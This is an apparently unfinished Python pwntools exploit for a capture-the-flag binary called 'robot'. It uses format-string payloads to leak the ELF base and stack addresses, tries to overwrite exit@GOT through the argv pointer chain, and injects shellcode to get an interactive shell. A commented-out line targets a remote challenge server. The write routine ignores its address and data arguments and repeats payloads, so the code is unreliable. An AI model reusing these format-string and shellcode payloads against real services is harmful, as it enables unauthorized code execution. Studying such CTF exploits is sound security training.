#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

import time
from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'info')

elf  = ELF('./robot')

# Byte sequence alias
A8 = 8 * b'A'


class FmtExp:
    def __init__(self, proc, rsp):
        self.proc = proc
        self.rsp = rsp
        self.leak_argv_chain()

    @staticmethod
    def offset(rsp, addr) -> bytes:
        return str((addr - rsp) // 8 + 5).encode('utf-8')

    def leak_argv_chain(self):
        # Leak the address of argv chain
        # https://frozenkp.github.io/pwn/format_string/
        self.entry0 = self.rsp + (0x7ffe9b5028c8 - 0x7ffe9b5027d0)
        self.entry0_offset = FmtExp.offset(self.rsp, self.entry0)
        log.info('argv chain entry0: {}'.format(hex(self.entry0)))

        time.sleep(0.1)
        self.proc.sendline(b'M.%' + self.entry0_offset + b'$p')
        self.proc.recvuntil(b'M.')
        self.entry1 = int(self.proc.recvline(), 16)
        self.entry1_offset = FmtExp.offset(self.rsp, self.entry1)
        log.info('argv chain entry1: {}'.format(hex(self.entry1)))

        time.sleep(0.1)
        self.proc.sendline(b'M.%' + self.entry1_offset + b'$p')
        self.proc.recvuntil(b'M.')
        self.entry2 = int(self.proc.recvline(), 16)
        self.entry2_offset = FmtExp.offset(self.rsp, self.entry2)
        log.info('argv chain entry2: {}'.format(hex(self.entry2)))


    def write(self, addr, data):
        '''
        https://frozenkp.github.io/pwn/format_string/

        0x7ffe9538a518 —▸ 0x7ffe9538a5e8 —▸ 0x7ffe9538b901 ◂— '/home/robot/robot'
            argv0               argv1             argv2
        '''
        # 第一步：透過 argv1 寫 2 bytes
        time.sleep(0.1)
        self.proc.sendline(b'M%' + b'28' + b'c%' + b'62' + b'$hn')
        self.proc.recvuntil(b'M')

        # 第二步：透過 argv0 移動 2
        time.sleep(0.1)
        self.proc.sendline(b'M%36$hhn')
        self.proc.recvuntil(b'M')

        # 第三步：透過 argv1 寫 2 bytes
        time.sleep(0.1)
        self.proc.sendline(b'M%28c%62$hhn')
        self.proc.recvuntil(b'M')

        # 第四步：透過 argv0 移動回來
        time.sleep(0.1)
        self.proc.sendline(b'M%36$hhn')
        self.proc.recvuntil(b'M')

        # 第五步：透過 argv2 寫入 0xdeadbeef
        time.sleep(0.1)
        self.proc.sendline(b'M%36$hhn')
        self.proc.recvuntil(b'M')


def get_shellcode(path):
    with open(path, 'rb') as f:
        return f.read()


def main():
    '''
    攻擊思路：GOT Hijacking + ROP
    * 修改 exit@GOT 為一個直接 return 的 gadget (?)

    Format string note
    ==================
    This will leak rdx, rcx, r8, r9, [rsp], [rsp+8], ...
    %1$p = rdx
    %2$p = rcx
    %3$p = r8
    %4$p = r9
    %5$p = [rsp]
    %6$p = [rsp+8]
    '''
    # proc = remote('140.112.31.97', 30202)
    proc = elf.process()
    log.debug('You may attatch this process to gdb now.')
    input()

    proc.recvuntil('Give me code : ')
    proc.sendline(get_shellcode('./shellcode/shell.bin'))

    # Leak elf base address
    time.sleep(0.1)
    proc.sendline(b'M.%33$p')
    proc.recvuntil(b'M.')
    __libc_csu_init = int(proc.recvline(), 16)
    elf_base = __libc_csu_init - (0x55d19334fa40 - 0x55d19334e000)
    elf_got_exit = elf_base + (0x556d40442088 - 0x556d4043e000)
    log.info('__libc_csu_init: {}'.format(hex(__libc_csu_init)))
    log.info('elf_base: {}'.format(hex(elf_base)))
    log.info('exit@got: {}'.format(hex(elf_got_exit)))

    # Leak rsp
    time.sleep(0.1)
    proc.sendline(b'M.%31$p')
    proc.recvuntil(b'M.')
    rsp = int(proc.recvline(), 16) - (0x7ffd0892a010 - 0x7ffd08929e50)
    log.info('rsp: {}'.format(hex(rsp)))

    fmt = FmtExp(proc, rsp)
    fmt.write(elf_got_exit, 0xdeadbeef)

    proc.interactive()


if __name__ == '__main__':
    main()
